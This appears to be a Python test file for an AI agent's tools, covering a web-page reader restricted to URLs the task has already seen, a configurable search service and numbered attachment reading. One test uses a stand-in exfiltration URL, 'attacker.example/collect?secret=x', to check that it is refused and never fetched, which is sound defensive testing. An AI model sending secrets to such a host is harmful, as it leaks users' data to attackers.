"""The tools of the services in a background task: a page is read only at an address the task has
seen (`url_not_seen` for any other), the search uses the service chosen, and the task's own files
are read by their number. Fakes for every service: no test reaches the network."""

import json

import httpx
import pytest

from raphael_core.agent.tools import Tools
from raphael_core.background.snapshot import take_snapshot
from raphael_core.services.attachments import checked
from raphael_core.services.hub import ServiceHub
from raphael_core.services.keys import memory_keys

from .conftest import LOCAL_NOW
from .test_run import Rig

PUBLIC = "93.184.216.34"
PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
REQUEST = "Summarise https://docs.example/guide and what you find about it."


class Web:
    def __init__(self):
        self.requests: list[httpx.Request] = []

    def handle(self, request):
        self.requests.append(request)
        if request.url.host == "api.search.brave.com":
            results = [{"title": "Found", "url": "https://found.example/article", "description": "d"}]
            return httpx.Response(200, json={"web": {"results": results}})
        host = request.headers.get("host")
        if host == "docs.example":
            return httpx.Response(200, html="<p>See https://linked.example/next for more.</p>")
        return httpx.Response(200, html=f"<p>Page of {host}{request.url.path}</p>")

    def hosts(self):
        return [r.headers.get("host", r.url.host) for r in self.requests]


@pytest.fixture
async def web_rig(conn, plugins):
    web = Web()

    async def resolve(host, port):
        return [PUBLIC]

    rigs = []

    def build(files=()):
        rig = Rig(
            conn,
            plugins,
            snapshot=take_snapshot(plugins.hub, attachments=bool(files)),
            request=REQUEST,
            attachments=list(files),
        )
        keys = memory_keys()
        hub = ServiceHub(
            conn, rig.client, keys, transport=httpx.MockTransport(web.handle), resolver=resolve
        )
        # The task's lookups, on the services chosen (the app gives the worker its Tools so).
        rig.run._tools = Tools(rig.client, http=rig.meteo.http, now=lambda: LOCAL_NOW, services=hub)
        rig.web, rig.keys, rig.hub = web, keys, hub
        rigs.append(rig)
        return rig

    yield build
    for rig in rigs:
        await rig.meteo.http.aclose()
        await rig.hub.aclose()


async def test_an_address_of_the_task_itself_is_read(web_rig):
    rig = web_rig()
    reply = await rig.tool("web_read", {"url": "https://docs.example/guide"})
    assert reply["ok"] and "linked.example/next" in reply["content"]
    (step,) = rig.steps()
    assert (step.tool, step.outcome, step.detail, step.tier) == ("web_read", "ok", "builtin", "T0")


async def test_an_address_never_seen_is_refused_and_not_fetched(web_rig, caplog):
    rig = web_rig()
    reply = await rig.tool("web_read", {"url": "https://attacker.example/collect?secret=x"})
    assert reply == {"ok": False, "kind": "url_not_seen", "content": "", "truncated": False}
    assert rig.web.requests == []
    (step,) = rig.steps()
    assert (step.outcome, step.reason) == ("blocked", "blocked")
    assert "attacker" not in caplog.text


async def test_an_address_a_page_read_holds_may_be_read_next(web_rig):
    rig = web_rig()
    assert not (await rig.tool("web_read", {"url": "https://linked.example/next"}))["ok"]
    await rig.tool("web_read", {"url": "https://docs.example/guide"})
    reply = await rig.tool("web_read", {"url": "https://linked.example/next"})
    assert reply["ok"] and "Page of linked.example/next" in reply["content"]


async def test_the_same_page_with_another_query_counts_as_seen(web_rig):
    rig = web_rig()
    assert (await rig.tool("web_read", {"url": "https://docs.example/guide?page=2"}))["ok"]
    assert not (await rig.tool("web_read", {"url": "https://docs.example/other"}))["ok"]


async def test_a_search_with_the_service_chosen_makes_its_results_readable(web_rig):
    rig = web_rig()
    rig.settings.set("web_search_service", "brave")
    rig.keys.set("brave", "k")
    found = await rig.tool("web_search", {"query": "something"})
    assert found["ok"] and json.loads(found["content"])["results"][0]["url"] == "https://found.example/article"
    assert rig.client.text_calls == []  # not OpenRouter's search
    reply = await rig.tool("web_read", {"url": "https://found.example/article"})
    assert reply["ok"]
    search, read = rig.steps()
    assert (search.tool, search.detail) == ("web_search", "brave")
    assert (read.tool, read.detail) == ("web_read", "builtin")


async def test_the_tasks_own_files_are_read_by_their_number_and_nothing_else(web_rig):
    image = checked("photo.png", "image/png", PNG)
    rig = web_rig([image])
    rig.client.search_text = "A photo of a receipt."
    names = [d["function"]["name"] for d in rig.run.snapshot.definitions]
    assert "read_attachment" in names
    reply = await rig.tool("read_attachment", {"index": 1, "question": "What is the total?"})
    assert reply["ok"] and "A photo of a receipt." in reply["content"]
    (call,) = rig.client.text_calls
    assert call["user"][1] == {"type": "image_url", "image_url": {"url": image.data_url()}}
    for index in (0, 2, "1", None, -1):
        assert (await rig.tool("read_attachment", {"index": index}))["kind"] == "bad_arguments"
    assert [s.detail for s in rig.steps()][0] == "image"


async def test_a_task_handed_over_with_files_is_told_of_them_and_offered_the_tool(make_rig):
    from .conftest import report

    rig = make_rig()
    rig.client.replies = [report("Done.")]
    image = checked("receipt.png", "image/png", PNG)
    task_id = rig.service.submit(
        session_id="s1", text="file this", language="en", model="fake/model", attachments=[image]
    )
    assert rig.service._attachments[task_id] == [image]
    await rig.wait_for_reports()
    (first,) = rig.client.chat_calls
    user = first["messages"][1]["content"]
    assert "<files>\n1. image/png: receipt.png\n</files>" in user
    assert "read_attachment" in [t["function"]["name"] for t in first["tools"]]
    assert rig.service._attachments == {}  # gone with the task, never written down
    row = rig.conn.execute("SELECT * FROM worker_tasks WHERE id = ?", (task_id,)).fetchone()
    assert "receipt" not in repr(tuple(row))


def test_a_task_without_files_is_not_offered_the_tool_that_reads_them():
    names = [d["function"]["name"] for d in take_snapshot(None).definitions]
    assert "read_attachment" not in names and "web_read" in names
